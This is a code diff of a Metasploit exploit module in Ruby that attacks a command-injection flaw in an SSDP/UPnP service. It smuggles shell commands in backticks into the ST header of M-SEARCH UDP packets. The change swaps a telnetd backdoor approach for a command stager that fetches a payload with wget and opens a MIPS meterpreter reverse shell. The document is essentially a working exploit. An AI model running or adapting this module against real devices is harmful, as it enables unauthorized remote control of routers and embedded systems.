@@ -8,8 +8,9 @@ require 'msf/core'
 class Metasploit3 < Msf::Exploit::Remote
   Rank = ExcellentRanking
 
+  include Msf::Exploit::Remote::HttpClient
   include Msf::Exploit::Remote::Udp
-  include Msf::Exploit::Remote::Tcp
+  include Msf::Exploit::CmdStager
 
   def initialize(info = {})
     super(update_info(info,
@@ -30,8 +31,8 @@ class Metasploit3 < Msf::Exploit::Remote
         ],
       'DisclosureDate' => 'Dec 24 2019',
       'Privileged'     => true,
-      'Platform'       => 'unix',
-      'Arch'        => ARCH_CMD,
+      'Platform'       => 'linux',
+      'Arch'        => ARCH_MIPSBE,
       'Payload'     =>
         {
           'Compat'  => {
@@ -41,23 +42,25 @@ class Metasploit3 < Msf::Exploit::Remote
         },
       'DefaultOptions' =>
         {
-            'PAYLOAD' => 'cmd/unix/interact'
+            'PAYLOAD' => 'linux/mipsbe/meterpreter_reverse_tcp',
+            'CMDSTAGER::FLAVOR' => 'wget'
         },
       'Targets'        =>
         [
           [ 'urn',
             {
-            'Arch' => ARCH_CMD,
-            'Platform' => 'unix'
+            'Arch' => ARCH_MIPSBE,
+            'Platform' => 'linux'
             }
           ],
           [ 'uuid',
             {
-            'Arch' => ARCH_CMD,
-            'Platform' => 'unix'
+            'Arch' => ARCH_MIPSBE,
+            'Platform' => 'linux'
             }
           ]
         ],
+      'CmdStagerFlavor' => %w{ echo printf wget },
       'DefaultTarget'  => 0
       ))
 
@@ -69,67 +72,26 @@ class Metasploit3 < Msf::Exploit::Remote
   end
 
   def exploit
-    telnetport = rand(65535)
+    execute_cmdstager(linemax: 1500)
+  end
 
-    print_status("#{rhost}:#{rport} - Telnet port used: #{telnetport}")
-    cmd = "`telnetd -p #{telnetport}`"
-
-    print_status("#{rhost}:#{rport} - Sending exploit request...")
-
+  def execute_command(cmd, opts)
     if target.name =~ /urn/
-      telnet_payload_urn(cmd)
+      print_status("Target Payload URN")
+      val = "urn:device:1;`#{cmd}`"
     elsif target.name =~ /uuid/
-      telnet_payload_uuid(cmd)
+      print_status("Target Payload UUID")
+      val = "uuid:`#{cmd}`"
     end
 
-    sleep 1
-    telnet_connect(rhost, telnetport)
-  end
-
-  def telnet_payload_urn(cmd)
-    print_status("Target -> urn:")
     connect_udp
     header =
       "M-SEARCH * HTTP/1.1\r\n" +
       "Host:239.255.255.250:1900\r\n" +
-      "ST:urn:device:1;#{cmd}\r\n" +
+      "ST:#{val}\r\n" +
       "Man:\"ssdp:discover\"\r\n" +
       "MX:2\r\n\r\n"
     udp_sock.put(header)
     disconnect_udp
-  end
-
-  def telnet_payload_uuid(cmd)
-    print_status("Target -> uuid:")
-    connect_udp
-    header =
-      "M-SEARCH * HTTP/1.1\r\n" +
-      "Host:239.255.255.250:1900\r\n" +
-      "ST:uuid:#{cmd}\r\n" +
-      "Man:\"ssdp:discover\"\r\n" +
-      "MX:2\r\n\r\n"
-    udp_sock.put(header)
-    disconnect_udp
-  end
-
-  def telnet_connect(rhost, telnetport)
-    tcp_sock = Rex::Socket.create_tcp({
-        'PeerHost' => rhost, 
-        'PeerPort' => telnetport.to_i
-    })
-    if tcp_sock.nil?
-      fail_with(Exploit::Failure::Unknown, "#{rhost}:#{rport} - Backdoor service has not been spawned!!!")
-    end
-
-    print_good("#{rhost}:#{rport} - Backdoor service has been spawned, handling...")
-    add_socket(tcp_sock)
-
-    print_status "Attempting to start a Telnet session #{rhost}:#{telnetport}"
-    print_good("#{rhost}:#{rport} - Telnet session successfully established...")
-
-    handler(tcp_sock)
-    if session_created?
-        remove_socket(tcp_sock)
-    end
   end
 end
